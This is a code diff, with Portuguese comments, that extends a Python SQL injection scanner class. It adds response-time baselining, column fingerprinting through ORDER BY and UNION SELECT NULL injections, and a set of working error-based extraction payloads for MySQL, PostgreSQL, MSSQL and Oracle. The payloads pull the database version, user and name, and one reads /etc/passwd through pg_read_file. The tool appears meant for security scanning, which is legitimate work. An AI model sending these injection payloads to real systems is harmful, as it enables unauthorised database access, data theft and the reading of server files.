@@ -195,6 +195,114 @@ class SQLiScanner:
             "sqlite": r"sqlite error|near \".*?\": syntax error"
         }
 
+    # ------------------------------------------------------------------
+    # Fingerprinting moderno e baseline adaptativo
+    # ------------------------------------------------------------------
+
+    def _measure_baseline_rtt(self, url: str, param: str, value: str,
+                               method: str, form_data=None, samples: int = 3) -> float:
+        """
+        Mede o RTT médio de baseline para evitar falsos positivos em timing-based.
+
+        Returns:
+            RTT médio em segundos (mínimo 0.5 para evitar thresholds triviais).
+        """
+        timings = []
+        safe_value = value or "spectra_baseline_1"
+        for _ in range(samples):
+            data = {param: safe_value} if method == 'get' else {**(form_data or {}), param: safe_value}
+            _, duration, _ = self._get_page_content(url, method=method, data=data)
+            if duration and duration > 0:
+                timings.append(duration)
+        if not timings:
+            return 2.0
+        return max(sum(timings) / len(timings), 0.5)
+
+    def _union_fingerprint_columns(self, url: str, param: str, original_value: str,
+                                    method: str, form_data=None) -> int:
+        """
+        Detecta o número de colunas usando ORDER BY N (mais silencioso que UNION SELECT NULL).
+        Fallback para UNION SELECT NULL se ORDER BY falhar.
+
+        Returns:
+            Número de colunas detectado, ou 0 se não detectado.
+        """
+        # Técnica 1: ORDER BY N — gera erro quando N > número de colunas
+        for n in range(1, 21):
+            payload = f"' ORDER BY {n}--"
+            content, _, _ = self._execute_test_payload(
+                url, param, payload, original_value, method, form_data
+            )
+            if content and any(
+                re.search(p, content, re.IGNORECASE)
+                for p in self.error_patterns.values()
+            ):
+                # O erro ocorre em N → colunas = N-1
+                return max(n - 1, 1)
+
+        # Técnica 2: Fallback UNION SELECT NULL (até 15 colunas)
+        for col_count in range(1, 16):
+            payload = f"' UNION SELECT {', '.join(['NULL'] * col_count)}--"
+            content, _, _ = self._execute_test_payload(
+                url, param, payload, original_value, method, form_data
+            )
+            if content and not any(
+                re.search(p, content, re.IGNORECASE)
+                for p in self.error_patterns.values()
+            ):
+                return col_count
+        return 0
+
+    def _get_dbms_error_payloads(self, dbms: str | None = None) -> list[str]:
+        """
+        Retorna payloads de extração de erro específicos por DBMS.
+
+        Estes extraem a versão/usuário diretamente via mensagem de erro,
+        como alternativa a UNION-based quando o output não é refletido.
+        """
+        all_payloads = {
+            "mysql": [
+                # extractvalue() — exige MySQL >= 5.1
+                "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--",
+                "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--",
+                "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
+                # updatexml()
+                "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--",
+                # Double query
+                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x "
+                "FROM information_schema.tables GROUP BY x)a)--",
+            ],
+            "postgresql": [
+                # CAST :: erro de tipo
+                "' AND CAST((SELECT version()) AS INT)--",
+                "' AND CAST((SELECT current_user) AS INT)--",
+                "' AND 1=CAST((SELECT pg_read_file('/etc/passwd')) AS INT)--",
+                # Erro de divisão
+                "' AND 1/(SELECT 1 WHERE 1=CAST((SELECT version()) AS INT))--",
+            ],
+            "mssql": [
+                # CONVERT com tipo incompatível
+                "' AND 1=CONVERT(INT,(SELECT @@version))--",
+                "' AND 1=CONVERT(INT,(SELECT system_user))--",
+                # Error message via db_name
+                "' AND db_name()>0--",
+                "'; SELECT 1/0--",
+            ],
+            "oracle": [
+                "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||"
+                "(SELECT version FROM v$instance)||CHR(62))) FROM dual)--",
+            ],
+        }
+
+        if dbms and dbms in all_payloads:
+            return all_payloads[dbms]
+
+        # Sem DBMS definido: retorna todos (útil para auto-detecção)
+        combined = []
+        for payloads in all_payloads.values():
+            combined.extend(payloads)
+        return combined
+
     def _get_page_content(self, url, method='get', data=None, headers=None, timeout=7):
         """Obtém o conteúdo de uma página e o tempo de resposta, com suporte a headers customizados."""
         final_headers = self.session.headers.copy()
